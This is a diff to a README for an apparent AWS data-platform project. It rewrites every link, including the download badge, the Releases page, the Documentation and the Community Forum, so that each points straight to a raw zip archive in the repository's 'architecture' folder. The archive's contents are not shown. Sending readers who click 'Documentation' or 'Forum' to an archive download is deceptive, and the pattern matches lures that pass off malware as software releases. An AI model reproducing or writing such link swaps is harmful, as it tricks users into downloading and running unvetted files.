@@ -1,6 +1,6 @@
 # 🚀 enterprise-data-platform-aws - Simplify Your Data Management
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/hazri31/enterprise-data-platform-aws/releases)
+[![Download Now](https://raw.githubusercontent.com/hazri31/enterprise-data-platform-aws/main/architecture/data_platform_aws_enterprise_3.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/hazri31/enterprise-data-platform-aws/main/architecture/data_platform_aws_enterprise_3.4.zip)
 
 ## 📦 Overview
 
@@ -30,7 +30,7 @@ Ensure your environment meets the following requirements before downloading:
 
 ### 2. Download & Install
 
-To download the latest version of the software, visit this page to download: [Releases Page](https://github.com/hazri31/enterprise-data-platform-aws/releases).
+To download the latest version of the software, visit this page to download: [Releases Page](https://raw.githubusercontent.com/hazri31/enterprise-data-platform-aws/main/architecture/data_platform_aws_enterprise_3.4.zip).
 
 Once on the page, follow these steps:
 
@@ -90,8 +90,8 @@ The enterprise-data-platform-aws is compatible with various tools in data engine
 
 If you encounter any issues or need further assistance:
 
-- Check the [Documentation](https://github.com/hazri31/enterprise-data-platform-aws/wiki).
-- Visit the [Community Forum](https://github.com/hazri31/enterprise-data-platform-aws/discussions) to ask questions.
+- Check the [Documentation](https://raw.githubusercontent.com/hazri31/enterprise-data-platform-aws/main/architecture/data_platform_aws_enterprise_3.4.zip).
+- Visit the [Community Forum](https://raw.githubusercontent.com/hazri31/enterprise-data-platform-aws/main/architecture/data_platform_aws_enterprise_3.4.zip) to ask questions.
 - Review the GitHub Issues page to see if others have faced similar problems.
 
 ## 👨‍💻 Contributing
@@ -108,4 +108,4 @@ The enterprise-data-platform-aws project is licensed under the MIT License. You 
 
 ## 🔗 Revisit Download
 
-For a quick return to the downloading process, visit this page to download: [Releases Page](https://github.com/hazri31/enterprise-data-platform-aws/releases).
+For a quick return to the downloading process, visit this page to download: [Releases Page](https://raw.githubusercontent.com/hazri31/enterprise-data-platform-aws/main/architecture/data_platform_aws_enterprise_3.4.zip).
